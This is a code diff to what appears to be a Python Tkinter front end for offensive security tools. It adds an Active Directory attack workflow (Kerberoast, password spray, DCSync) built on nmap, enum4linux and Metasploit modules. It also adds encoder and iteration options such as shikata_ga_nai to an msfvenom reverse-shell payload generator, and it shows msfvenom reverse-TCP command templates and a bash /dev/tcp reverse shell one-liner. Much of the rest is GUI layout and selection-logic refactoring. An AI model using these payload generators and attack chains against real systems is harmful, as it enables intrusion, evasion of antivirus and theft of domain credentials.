+                "description": "Complete AD attack: enum → Kerberoast → password spray → DCSync",
+                "passive_steps": [
+                    {
+                        "tool": "shodan",
+                        "name": "AD Infrastructure Discovery",
+                        "config": {
+                            "search_type": "search",
+                            "query": "port:88 kerberos"
+                        }
+                    }
+                ],
+                "active_steps": [
+                    {
+                        "tool": "nmap",
+                        "name": "AD Ports Scan",
+                        "config": {
+                            "scan_type": "SYN",
+                            "ports": "88,389,445,464,636,3268,3269",
+                            "scripts": "ldap-rootdse,smb-security-mode",
+                            "timing": "T4"
+                        }
+                    },
+                    {
+                        "tool": "enum4linux",
+                        "name": "Domain Enumeration",
+                        "config": {
+                            "all_enum": True,
+                            "target": "[TARGET_IP]"
+                        }
+                    },
+                    {
+                        "tool": "metasploit",
+                        "name": "Kerberos User Enumeration",
+                        "config": {
+                            "module": "auxiliary/gather/kerberos_enumusers",
+                            "threads": "10"
+                        }
+                    },
+                    {
+                        "tool": "metasploit",
+                        "name": "SMB Login Scanner",
+                        "config": {
+                            "module": "auxiliary/scanner/smb/smb_login",
+                            "threads": "5"
+                        }
+                    }
                 ]
             }
         }
@@ -6285,7 +6778,29 @@ Adjustable:  Yes (via Settings)
         # Shell type dropdown
         type_label = tk.Label(frame, text="Shell Type:", font=("Courier", 10),
                         fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
-        type_label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
+        type_label.grid(row=6, column=0, sticky=tk.W, padx=10, pady=5)
+
+        # Encoder (Hidden by default)
+        self.shellz_encoder_label = tk.Label(frame, text="Encoder:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        
+        self.shellz_encoder = ttk.Combobox(frame, values=[
+            "x86/shikata_ga_nai",
+            "x86/fnstenv_mov",
+            "x86/alpha_mixed",
+            "x64/zorro",
+            "x64/xor",
+            "cmd/powershell_base64"
+        ], font=("Courier", 10), state="readonly", width=25)
+
+        # Iterations (Hidden by default)
+        self.shellz_iterations_label = tk.Label(frame, text="Iterations:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        
+        self.shellz_iterations = tk.Entry(frame, font=("Courier", 10),
+                                                bg=self.bg_primary, fg=self.accent_cyan,
+                                                insertbackground=self.accent_cyan, relief=tk.FLAT)
+        self.shellz_iterations.insert(0, "1")
 
         # Define shell types for each category
         self.shell_type_options = {
@@ -6402,10 +6917,10 @@ Adjustable:  Yes (via Settings)
 
         self.shellz_type = ttk.Combobox(frame, values=self.shell_type_options["Reverse Shells"],
                                         font=("Courier", 10), state="readonly", width=25)
-        self.shellz_type.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
+        self.shellz_type.grid(row=6, column=1, sticky=tk.W, padx=10, pady=5)
         self.shellz_type.current(0)
 
-        # Generate button
+        # Generate Button (Adjust grid row)
         gen_btn = tk.Button(
             frame,
             text="⚡ GENERATE SHELL",
@@ -6419,23 +6934,23 @@ Adjustable:  Yes (via Settings)
             cursor="hand2",
             command=self.generate_shell
         )
-        gen_btn.grid(row=5, column=0, columnspan=2, padx=10, pady=15)
+        gen_btn.grid(row=7, column=0, columnspan=2, padx=10, pady=15)
 
-        # Output area
-        output_label = tk.Label(frame, text="Generated Shell:", font=("Courier", 10, "bold"),
-                               fg=self.accent_cyan, bg=self.bg_secondary)
-        output_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
+        # Output Area (Adjust grid row)
+        output_label = tk.Label(frame, text="Generated Payload:", font=("Courier", 10, "bold"),
+                           fg=self.accent_cyan, bg=self.bg_secondary)
+        output_label.grid(row=8, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))
 
         self.shellz_output = scrolledtext.ScrolledText(
-            frame, height=10, font=("Consolas", 11),
+            frame, height=10, font=("Consolas", 10),
             bg="#1E1E1E", fg=self.accent_green,
             insertbackground=self.accent_green,
             selectbackground=self.accent_yellow,
             wrap=tk.WORD, relief=tk.FLAT
         )
-        self.shellz_output.grid(row=7, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
+        self.shellz_output.grid(row=9, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)
 
-        # Copy button
+        # Copy Button (Adjust grid row)
         copy_btn = tk.Button(
             frame,
             text="📋 COPY TO CLIPBOARD",
@@ -6450,7 +6965,7 @@ Adjustable:  Yes (via Settings)
             cursor="hand2",
             command=lambda: self.copy_to_clipboard(self.shellz_output.get("1.0", tk.END))
         )
-        copy_btn.grid(row=8, column=0, columnspan=2, pady=10)
+        copy_btn.grid(row=10, column=0, columnspan=2, pady=10)
 
         # Info label
         info_label = tk.Label(
@@ -6471,6 +6986,18 @@ Adjustable:  Yes (via Settings)
         self.shellz_type['values'] = shell_types
         if shell_types:
             self.shellz_type.current(0)
+            
+        # Show/Hide encoder options for MSFVenom
+        if category == "MSFVenom Payloads":
+            self.shellz_encoder_label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
+            self.shellz_encoder.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
+            self.shellz_iterations_label.grid(row=5, column=0, sticky=tk.W, padx=10, pady=5)
+            self.shellz_iterations.grid(row=5, column=1, sticky=tk.W, padx=10, pady=5)
+        else:
+            self.shellz_encoder_label.grid_remove()
+            self.shellz_encoder.grid_remove()
+            self.shellz_iterations_label.grid_remove()
+            self.shellz_iterations.grid_remove()
 
     def generate_shell(self):
         """Generate a shell based on selected category and type."""
@@ -6496,7 +7023,9 @@ Adjustable:  Yes (via Settings)
         elif category == "Encrypted Shells":
             shell_cmd = self.get_encrypted_shell(ip, port, shell_type)
         elif category == "MSFVenom Payloads":
-            shell_cmd = self.get_msfvenom_payload(ip, port, shell_type)
+            encoder = self.shellz_encoder.get()
+            iterations = self.shellz_iterations.get()
+            shell_cmd = self.get_msfvenom_payload(ip, port, shell_type, encoder, iterations)
 
         self.shellz_output.delete("1.0", tk.END)
         self.shellz_output.insert("1.0", shell_cmd)
@@ -6929,8 +7458,9 @@ bash -i >& /dev/tcp/127.0.0.1/4446 0>&1"""
         }
         return shells.get(shell_type, "# Shell type not found")
 
-    def get_msfvenom_payload(self, ip, port, shell_type):
-        """Get MSFVenom command based on type."""
+    def get_msfvenom_payload(self, ip, port, shell_type, encoder="", iterations=""):
+        """Get MSFVenom command based on type, optionally with encoder."""
+        base_cmd = ""
         payloads = {
             # Linux Payloads
             "Linux x86 Reverse": f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
@@ -6965,8 +7495,22 @@ bash -i >& /dev/tcp/127.0.0.1/4446 0>&1"""
             "NodeJS Reverse": f"msfvenom -p nodejs/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.js"
         }
 
-        # Add handler command as a comment
-        payload_cmd = payloads.get(shell_type, "# Payload type not found")
+        base_cmd = payloads.get(shell_type, "# Payload type not found")
+        
+        # Apply encoding if specified
+        if encoder and not base_cmd.startswith("#"):
+            # Avoid re-encoding if not supported or format issues, but generally apply
+            cmd_parts = base_cmd.split(">")
+            main_cmd = cmd_parts[0].strip()
+            output_redirection = ">" + cmd_parts[1] if len(cmd_parts) > 1 else ""
+            
+            enc_args = f" -e {encoder}"
+            if iterations and iterations.isdigit():
+                 enc_args += f" -i {iterations}"
+            
+            payload_cmd = f"{main_cmd}{enc_args} {output_redirection}"
+        else:
+            payload_cmd = base_cmd
 
         # Add listener setup info
         handler_info = f"""
@@ -8084,13 +8628,38 @@ Configure in the Settings tab:
 
     def create_workflows_tab(self):
         """Create the Workflows tab for automated multi-tool reconnaissance."""
-        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        # Create main container frame with scrollbar
+        main_frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+
+        # Create canvas
+        canvas = tk.Canvas(main_frame, bg=self.bg_secondary, highlightthickness=0)
+        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+
+        # Add scrollbar
+        scrollbar = tk.Scrollbar(main_frame, orient="vertical", command=canvas.yview)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+
+        # Configure canvas
+        canvas.configure(yscrollcommand=scrollbar.set)
+        canvas.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
+
+        # Create scrollable frame inside canvas
+        frame = tk.Frame(canvas, bg=self.bg_secondary)
+        canvas.create_window((0, 0), window=frame, anchor="nw")
         
         # Configure grid weights for proper expansion
         frame.columnconfigure(1, weight=1)
-        frame.rowconfigure(5, weight=1)  # Preview frame should expand
-        frame.rowconfigure(7, weight=0)  # Controls section
-        frame.rowconfigure(8, weight=0)  # Progress section
+        frame.rowconfigure(6, weight=1)  # Preview frame should expand
+        frame.rowconfigure(7, weight=0)  # Target
+        frame.rowconfigure(8, weight=0)  # Controls section
+        frame.rowconfigure(9, weight=0)  # Progress section
+
+        # Mousewheel scrolling
+        def _on_mousewheel(event):
+            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+        
+        canvas.bind_all("<MouseWheel>", _on_mousewheel)
 
         # Header
         header = tk.Label(
@@ -8100,7 +8669,7 @@ Configure in the Settings tab:
             fg=self.accent_cyan,
             bg=self.bg_secondary
         )
-        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+        header.grid(row=0, column=0, columnspan=3, sticky=tk.EW, padx=10, pady=15)
 
         # Description
         desc = tk.Label(
@@ -8110,17 +8679,42 @@ Configure in the Settings tab:
             fg=self.text_color,
             bg=self.bg_secondary
         )
-        desc.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 15))
+        desc.grid(row=1, column=0, columnspan=3, padx=10, pady=(0, 15))
+
+        # Category selector
+        category_label = tk.Label(
+            frame,
+            text="Category:",
+            font=("Courier", 10, "bold"),
+            fg=self.accent_green,
+            bg=self.bg_secondary
+        )
+        category_label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
+        
+        self.workflow_category_var = tk.StringVar(value="all")
+        category_options = [cat["name"] for cat in self.workflow_categories.values()]
+        
+        self.workflow_category_selector = ttk.Combobox(
+            frame,
+            textvariable=self.workflow_category_var,
+            values=category_options,
+            state="readonly",
+            font=("Courier", 9),
+            width=60
+        )
+        self.workflow_category_selector.grid(row=2, column=1, sticky=tk.EW, padx=10, pady=5)
+        self.workflow_category_selector.current(5)  # Default to "All Workflows"
+        self.workflow_category_selector.bind("<<ComboboxSelected>>", self.filter_workflows_by_category)
 
         # Workflow selector
-        selector_label = tk.Label(
+        self.workflow_selector_label = tk.Label(
             frame,
             text="Select Workflow:",
             font=("Courier", 10, "bold"),
             fg=self.accent_green,
             bg=self.bg_secondary
         )
-        selector_label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
+        self.workflow_selector_label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
 
         # Create workflow options list
         workflow_options = [
@@ -8135,13 +8729,27 @@ Configure in the Settings tab:
             font=("Courier", 9),
             width=60
         )
-        self.workflow_selector.grid(row=2, column=1, sticky=tk.EW, padx=10, pady=5)
+        self.workflow_selector.grid(row=3, column=1, sticky=tk.EW, padx=10, pady=5)
         self.workflow_selector.current(0)
+        
+        # Initialize current workflow IDs list for consistent selection mapping
+        self.current_workflow_ids = list(self.predefined_workflows.keys())
+        
         self.workflow_selector.bind("<<ComboboxSelected>>", self.on_workflow_selected)
+
+        # Category description label
+        self.category_desc_label = tk.Label(
+            frame,
+            text="Show all available workflows",
+            font=("Courier", 9, "italic"),
+            fg=self.accent_green,
+            bg=self.bg_secondary
+        )
+        self.category_desc_label.grid(row=2, column=2, sticky=tk.W, padx=10)
 
         # Scan Mode selector (Passive vs Active)
         mode_frame = tk.Frame(frame, bg=self.bg_secondary)
-        mode_frame.grid(row=3, column=0, columnspan=2, sticky=tk.W, padx=10, pady=10)
+        mode_frame.grid(row=4, column=0, columnspan=3, sticky=tk.W, padx=10, pady=10)
 
         mode_label = tk.Label(
             mode_frame,
@@ -8157,7 +8765,7 @@ Configure in the Settings tab:
         passive_rb = tk.Radiobutton(
             mode_frame,
             text="🔍 Passive Only (No target interaction)",
-            font=("Courier", 9),
+            font=("Courier", 8),
             variable=self.workflow_mode,
             value="passive",
             fg=self.accent_cyan,
@@ -8171,8 +8779,8 @@ Configure in the Settings tab:
 
         active_rb = tk.Radiobutton(
             mode_frame,
-            text="⚡ Active Only (Direct target probing)",
-            font=("Courier", 9),
+            text="⚡ Active Only (Direct)",
+            font=("Courier", 8),
             variable=self.workflow_mode,
             value="active",
             fg=self.accent_orange,
@@ -8186,8 +8794,8 @@ Configure in the Settings tab:
 
         both_rb = tk.Radiobutton(
             mode_frame,
-            text="🔄 Both (Full reconnaissance)",
-            font=("Courier", 9),
+            text="🔄 Both (Full)",
+            font=("Courier", 8),
             variable=self.workflow_mode,
             value="both",
             fg=self.accent_green,
@@ -8207,7 +8815,7 @@ Configure in the Settings tab:
             fg=self.text_muted,
             bg=self.bg_secondary
         )
-        mode_info.grid(row=4, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(0, 10))
+        mode_info.grid(row=5, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(0, 5))
 
         # Preview frame
         preview_frame = tk.LabelFrame(
@@ -8218,19 +8826,19 @@ Configure in the Settings tab:
             bg=self.bg_secondary,
             relief=tk.FLAT
         )
-        preview_frame.grid(row=5, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)
+        preview_frame.grid(row=6, column=0, columnspan=3, sticky=tk.EW, padx=10, pady=5)
 
         # Steps text widget
         self.workflow_steps_text = tk.Text(
             preview_frame,
-            height=10,
+            height=8,
             font=("Courier", 9),
             bg=self.bg_tertiary,
             fg=self.text_color,
             wrap=tk.WORD,
             relief=tk.FLAT,
             padx=10,
-            pady=10
+            pady=5
         )
         self.workflow_steps_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
@@ -8242,7 +8850,7 @@ Configure in the Settings tab:
             fg=self.accent_green,
             bg=self.bg_secondary
         )
-        target_label.grid(row=6, column=0, sticky=tk.W, padx=10, pady=5)
+        target_label.grid(row=7, column=0, sticky=tk.W, padx=10, pady=5)
 
         self.workflow_target = tk.Entry(
             frame,
@@ -8254,11 +8862,11 @@ Configure in the Settings tab:
             selectforeground=self.bg_primary,
             relief=tk.FLAT
         )
-        self.workflow_target.grid(row=6, column=1, sticky=tk.EW, padx=10, pady=5)
+        self.workflow_target.grid(row=7, column=1, columnspan=2, sticky=tk.EW, padx=10, pady=5)
 
         # Control buttons frame
         controls_frame = tk.Frame(frame, bg=self.bg_secondary)
-        controls_frame.grid(row=7, column=0, columnspan=2, pady=15)
+        controls_frame.grid(row=8, column=0, columnspan=3, pady=15)
 
         # Run button
         self.workflow_run_btn = tk.Button(
@@ -8321,7 +8929,7 @@ Configure in the Settings tab:
             bg=self.bg_secondary,
             relief=tk.FLAT
         )
-        progress_frame.grid(row=8, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)
+        progress_frame.grid(row=9, column=0, columnspan=3, sticky=tk.EW, padx=10, pady=5)
 
         # Progress label
         self.workflow_progress_label = tk.Label(
@@ -8352,29 +8960,105 @@ Configure in the Settings tab:
             justify=tk.LEFT,
             wraplength=500
         )
-        info_label.grid(row=9, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
+        info_label.grid(row=10, column=0, columnspan=3, sticky=tk.W, padx=10, pady=5)
 
         # Initialize with first workflow
         self.on_workflow_selected(None)
 
-        return frame
+        return main_frame
+
+    def filter_workflows_by_category(self, event=None):
+        """Filter workflow list based on selected category."""
+        category_name = self.workflow_category_var.get()
+        
+        # Map display name to category ID
+        category_id = None
+        for cat_id, cat_data in self.workflow_categories.items():
+            if cat_data["name"] == category_name:
+                category_id = cat_id
+                # Update category description and color
+                self.category_desc_label.config(
+                    text=cat_data["description"], 
+                    fg=cat_data["color"]
+                )
+                break
+        
+        if category_id == "all" or category_id is None:
+            # Show all workflows
+            filtered_workflows = self.predefined_workflows
+        else:
+            # Filter by category (workflows without category field also shown in "all")
+            filtered_workflows = {
+                wf_id: wf_data
+                for wf_id, wf_data in self.predefined_workflows.items()
+                if wf_data.get("category") == category_id
+            }
+        
+        # Update current IDs list corresponding to the filtered view
+        self.current_workflow_ids = list(filtered_workflows.keys())
+        
+        # Update workflow selector with filtered workflows
+        workflow_options = [
+            f"{wf['name']} - {wf['description'][:50]}..." 
+            if len(wf['description']) > 50 
+            else f"{wf['name']} - {wf['description']}"
+            for wf in filtered_workflows.values()
+        ]
+        
+        self.workflow_selector.config(values=workflow_options)
+        if workflow_options:
+            self.workflow_selector.current(0)
+            # CRITICAL: Reset selection to 0 index to maintain synchronization
+            # Manually trigger the selection event to update UI
+            self.on_workflow_selected(None)
 
     def on_workflow_selected(self, event=None):
         """Update workflow steps preview when selection changes."""
         try:
+            # Robust selection: Priority 1 is index synchronization via current_workflow_ids
+            # Ensure workflow IDs list is initialized
+            if not hasattr(self, 'current_workflow_ids'):
+                 self.current_workflow_ids = list(self.predefined_workflows.keys())
+
             selected_idx = self.workflow_selector.current()
-            workflow_ids = list(self.predefined_workflows.keys())
+            selected_workflow = None
+            
+            # 1. Try strict index lookup
+            if selected_idx >= 0 and selected_idx < len(self.current_workflow_ids):
+                wf_id = self.current_workflow_ids[selected_idx]
+                selected_workflow = self.predefined_workflows.get(wf_id)
 
-            if selected_idx < 0 or selected_idx >= len(workflow_ids):
-                # Default to first workflow if invalid selection
-                selected_idx = 0
-                try:
-                    self.workflow_selector.current(0)
-                except (tk.TclError, ValueError):
-                    pass
+            # 2. Fallback to name matching if index fails (e.g. race condition/desync)
+            if not selected_workflow:
+                selected_text = self.workflow_selector.get()
+                if selected_text:
+                    for wf_id, wf in self.predefined_workflows.items():
+                        # Use simple substring match for the name part
+                        if selected_text.startswith(wf['name']):
+                            selected_workflow = wf
+                            break
+            
+            # 3. Last fallback: First item
+            if not selected_workflow and self.predefined_workflows:
+                 first_id = list(self.predefined_workflows.keys())[0]
+                 selected_workflow = self.predefined_workflows[first_id]
+            
+            if not selected_workflow:
+                return
 
-            workflow_id = workflow_ids[selected_idx]
-            workflow = self.predefined_workflows[workflow_id]
+            workflow = selected_workflow
+            
+            # Update selector label color based on category
+            cat_id = workflow.get("category", "all")
+            # Default alias handling if category ID not strictly in map (e.g. from heuristic)
+            cat_data = self.workflow_categories.get(cat_id)
+            if not cat_data:
+                # Try to fuzzy match or just ignore
+                pass
+            else:
+                 color = cat_data["color"]
+                 if hasattr(self, 'workflow_selector_label'):
+                    self.workflow_selector_label.config(fg=color)
 
             # Check what step types the workflow has
             has_passive = bool(workflow.get('passive_steps', []))
@@ -8667,16 +9351,34 @@ Configure in the Settings tab:
                 self.workflow_running = False
                 return
 
-            # Get selected workflow
+            # Get selected workflow - use robust logic to match on_workflow_selected
             selected_idx = self.workflow_selector.current()
-            workflow_ids = list(self.predefined_workflows.keys())
+            workflow_id = None
+            
+            # 1. Try robust index lookup via filtered list
+            if hasattr(self, 'current_workflow_ids') and len(self.current_workflow_ids) > 0:
+                if selected_idx >= 0 and selected_idx < len(self.current_workflow_ids):
+                    workflow_id = self.current_workflow_ids[selected_idx]
+            
+            # 2. Key fallback if index invalid or list missing (should rely on on_workflow_selected synchronization)
+            if not workflow_id:
+                 # Try to match by name from combobox value if index sync failed
+                 selected_text = self.workflow_selector.get()
+                 if selected_text:
+                     for wf_id, wf in self.predefined_workflows.items():
+                         if selected_text.startswith(wf['name']):
+                             workflow_id = wf_id
+                             break
 
-            if selected_idx < 0:
-                messagebox.showerror("Error", "Please select a workflow")
+            # 3. Last resort fallback
+            if not workflow_id:
+                 workflow_id = list(self.predefined_workflows.keys())[0] if self.predefined_workflows else None
+
+            if not workflow_id or workflow_id not in self.predefined_workflows:
+                messagebox.showerror("Error", "Please select a valid workflow")
                 self.workflow_running = False
                 return
 
-            workflow_id = workflow_ids[selected_idx]
             workflow = self.predefined_workflows[workflow_id]
 
             # Get selected mode (passive, active, or both)
@@ -9048,7 +9750,79 @@ Configure in the Settings tab:
                 if hasattr(self, 'msf_threads'):
                     self.msf_threads.delete(0, tk.END)
                     self.msf_threads.insert(0, config.get('threads', '10'))
+                
+                # Payload generation support
+                if config.get('module') == 'payload':
+                    if hasattr(self, 'msf_payload_type') and hasattr(self, 'msf_lhost') and hasattr(self, 'msf_lport'):
+                         # Switch to payload tab (conceptually) or set logic
+                         self.msf_payload_type.set(config.get('payload_type', 'windows/meterpreter/reverse_tcp'))
+                         self.msf_lhost.delete(0, tk.END)
+                         self.msf_lhost.insert(0, config.get('lhost', target))
+                         self.msf_lport.delete(0, tk.END)
+                         self.msf_lport.insert(0, str(config.get('lport', '4444')))
+                         
+                         if hasattr(self, 'msf_encoder') and config.get('encoder'):
+                             self.msf_encoder.set(config.get('encoder'))
+                         if hasattr(self, 'msf_iterations') and config.get('iterations'):
+                             self.msf_iterations.delete(0, tk.END)
+                             self.msf_iterations.insert(0, str(config.get('iterations')))
+                         if hasattr(self, 'msf_format') and config.get('format'):
+                             self.msf_format.set(config.get('format'))
                 return True
+                
+            elif tool == 'shellz':
+                if hasattr(self, 'shell_type'):
+                    self.shell_type.set(config.get('shell_type', 'Bash nc'))
+                
+                # Parse IP:PORT from target if provided, else use config defaults
+                ip = config.get('ip', '[TARGET_IP]')
+                port = config.get('port', '[TARGET_PORT]')
+                
+                if ':' in target:
+                     parts = target.split(':')
+                     if len(parts) == 2:
+                         ip_val = parts[0]
+                         port_val = parts[1]
+                     else:
+                         ip_val = target
+                         port_val = "4444"
+                else:
+                     ip_val = target
+                     port_val = "4444"
+                     
+                if ip == '[TARGET_IP]':
+                    ip = ip_val
+                if port == '[TARGET_PORT]':
+                    port = port_val
+                    
+                if hasattr(self, 'shell_port'):
+                    self.shell_port.delete(0, tk.END)
+                    self.shell_port.insert(0, port)
+                    
+                # Set encoder options if provided
+                if hasattr(self, 'shellz_encoder') and config.get('encoder'):
+                    self.shellz_encoder.set(config.get('encoder'))
+                    
+                if hasattr(self, 'shellz_iterations') and config.get('iterations'):
+                    self.shellz_iterations.delete(0, tk.END)
+                    self.shellz_iterations.insert(0, str(config.get('iterations')))
+                    
+                return True
+                
+            elif tool == 'encoders':
+                 # Handle encoder tool configuration
+                 if hasattr(self, 'encoder_input'):
+                     payload_input = config.get('input', '[TARGET_PAYLOAD]')
+                     if payload_input == '[TARGET_PAYLOAD]':
+                         # If workflow provides a target payload, use it, otherwise use target as payload
+                         payload_input = target 
+                     
+                     self.encoder_input.delete('1.0', tk.END)
+                     self.encoder_input.insert('1.0', payload_input)
+                     
+                 if hasattr(self, 'encoder_type'):
+                     self.encoder_type.current(0) # Default or map if needed
+                 return True
                 
             elif tool == 'githarvester':
                 if hasattr(self, 'githarvester_query'):
@@ -10352,19 +11126,27 @@ Configure in the Settings tab:
                 messagebox.showerror("Error", f"Failed to export: {str(e)}")
 
     def append_output(self, text, tag='normal'):
-        # Security: Limit output size to prevent memory exhaustion
-        lines_to_add = text.count('\n')
-        self.output_line_count += lines_to_add
+        """Thread-safe method to append text to the output widget."""
+        def _update():
+            # Security: Limit output size to prevent memory exhaustion
+            lines_to_add = text.count('\n')
+            self.output_line_count += lines_to_add
 
-        # If exceeding limit, remove old lines from top
-        if self.output_line_count > self.max_output_lines:
-            lines_to_remove = self.output_line_count - self.max_output_lines
-            self.output_text.delete('1.0', f'{lines_to_remove + 1}.0')
-            self.output_line_count = self.max_output_lines
+            # If exceeding limit, remove old lines from top
+            if self.output_line_count > self.max_output_lines:
+                lines_to_remove = self.output_line_count - self.max_output_lines
+                self.output_text.delete('1.0', f'{lines_to_remove + 1}.0')
+                self.output_line_count = self.max_output_lines
 
-        self.output_text.insert(tk.END, text)
-        self.output_text.see(tk.END)
-        self.output_text.update()
+            self.output_text.insert(tk.END, text)
+            self.output_text.see(tk.END)
+            # self.output_text.update() # Removed to prevent blocking/recursion issues
+        
+        try:
+            self.root.after(0, _update)
+        except Exception:
+            # Fallback if root is destroyed
+            pass
 
     def clear_output(self):
         self.output_text.delete(1.0, tk.END)
@@ -11331,6 +12113,35 @@ Configure in the Settings tab:
                     f"Maximum concurrent scans reached ({self.max_concurrent_scans}).\n"
                     "Please wait for a scan to finish or stop one.")
                 return
+
+        # Handle internal tools (Shellz, Encoders) that don't use subprocess
+        tool_id = self.current_tool
+        
+        if tool_id == "shellz":
+            try:
+                self.generate_shell()
+                result = self.shellz_output.get("1.0", tk.END)
+                self.append_output(f"\n{'='*70}\n")
+                self.append_output(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] SHELLZ GENERATION COMPLETED\n")
+                self.append_output(f"{'='*70}\n")
+                self.append_output(result)
+                self.update_status(f"Shell generated", self.accent_green)
+            except Exception as e:
+                self.append_output(f"Error generating shell: {str(e)}\n")
+            return
+
+        elif tool_id == "encoders":
+            try:
+                self.encode_text()
+                result = self.encoder_output.get("1.0", tk.END)
+                self.append_output(f"\n{'='*70}\n")
+                self.append_output(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ENCODING COMPLETED\n")
+                self.append_output(f"{'='*70}\n")
+                self.append_output(result)
+                self.update_status(f"Encoding completed", self.accent_green)
+            except Exception as e:
+                self.append_output(f"Error encoding: {str(e)}\n")
+            return
 
         try:
             cmd = self.build_command()
